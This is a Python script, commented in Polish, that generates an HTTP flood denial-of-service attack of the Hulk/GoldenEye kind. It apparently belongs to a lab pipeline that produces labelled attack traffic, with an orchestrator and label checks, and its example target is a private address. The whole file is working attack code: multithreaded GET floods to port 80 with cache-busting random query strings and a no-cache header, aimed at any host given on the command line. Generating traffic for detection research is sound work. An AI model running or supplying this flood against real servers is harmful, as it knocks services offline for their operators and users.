#!/usr/bin/env python3
"""Generator HTTP flood.

Rola: Generuje atak HTTP flood (A4) - zalew krótkich żądań GET do serwera web, wzorzec Hulk/GoldenEye.
Uruchamia go orchestrator.run_http_flood; log z requests=<n> czyta tool_logs.flood_requests
- niezależna kontrola etykiet w check_labels.

    python3 http_flood.py --target 10.0.10.10 --duration 15 --threads 30 --rps 300 --log a4.log
"""
import argparse
import http.client
import random
import string 
import threading #flood jest wielowątkowy
import time

STOP = threading.Event() #wspólny wyłącznik - main ustawia go po duration a wątki co iteracje sprawdzaja i koncza
COUNT = [0] # wspolny licznik udanych żądań
LOCK = threading.Lock() #chroni dostęp do licznika

#losowa ścieżka (cache-busting): każde żądanie jest "inne", więc żaden cache nie odpowie za serwer
# to flood na backend - wzorzec Hulk
def rand_path():
    parameter = "".join(random.choices(string.ascii_letters + string.digits, k=8))
    return f"/?{parameter}={random.randint(0, 10**6)}"

#Jeden wątek: dopóki nie STOP - otwórz połączenie na port 80, wyślij GET z losową ścieżka, odczytaj i zamknij
#zwiększ licznik pod blokadą. Cache-control: no-cache - dodatkowo wymusza świeżą odpowiedź;
#except: pass - pod obciążeniem
# błędy połączeń są normalne, więc milczymy
def worker(target, min_interval):
    while not STOP.is_set():
        try:
            conn = http.client.HTTPConnection(target, 80, timeout=5)
            conn.request("GET", rand_path(), headers={"User-Agent": "flood/1.0", "Cache-Control": "no-cache"})
            conn.getresponse().read()
            conn.close()
            with LOCK:
                COUNT[0] += 1
        except Exception:
            pass
        if min_interval:
            time.sleep(min_interval)


# cały atak A4: threads wątków przez duration sekund, potem zatrzymanie i log z liczbą udanych żądań
def main():
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--target", required=True)  # adres serwera web (cel floodu)
    parser.add_argument("--duration", type=float, default=15)
    parser.add_argument("--threads", type=int, default=30)
    parser.add_argument("--rps", type=float, default=300, help="górny pułap żądań/s (łącznie)")
    parser.add_argument("--seed", type=int, default=0, help="ziarno losowych ścieżek (podaje je orkiestrator)")
    parser.add_argument("--log", required=True)  # plik logu (czyta go tool_logs.flood_requests)
    args = parser.parse_args()
    random.seed(args.seed)

    # Przybliżony limit tempa: minimalny odstęp na wątek = threads / rps.
    min_interval = max(0.0, args.threads / args.rps) if args.rps else 0.0
    start = time.time()
    # uruchom wszystkie wątki; main odmierza czas ataku (duration), potem STOP i chwila na dokończenie (join)
    workers = [threading.Thread(target=worker, args=(args.target, min_interval), daemon=True)
               for _ in range(args.threads)]
    for thread in workers:
        thread.start()
    time.sleep(args.duration)
    STOP.set()
    for thread in workers:
        thread.join(timeout=2)
    elapsed = time.time() - start
    # z całej linii logu tool_logs.flood_requests czyta tylko requests=<n>; reszta to diagnostyka
    with open(args.log, "w") as f:
        f.write(f"http_flood target={args.target} duration={elapsed:.1f}s threads={args.threads} "
                f"requests={COUNT[0]} rps={COUNT[0] / elapsed:.1f}\n")
    print(f"requests={COUNT[0]} rps={COUNT[0] / elapsed:.1f}")


if __name__ == "__main__":
    main()
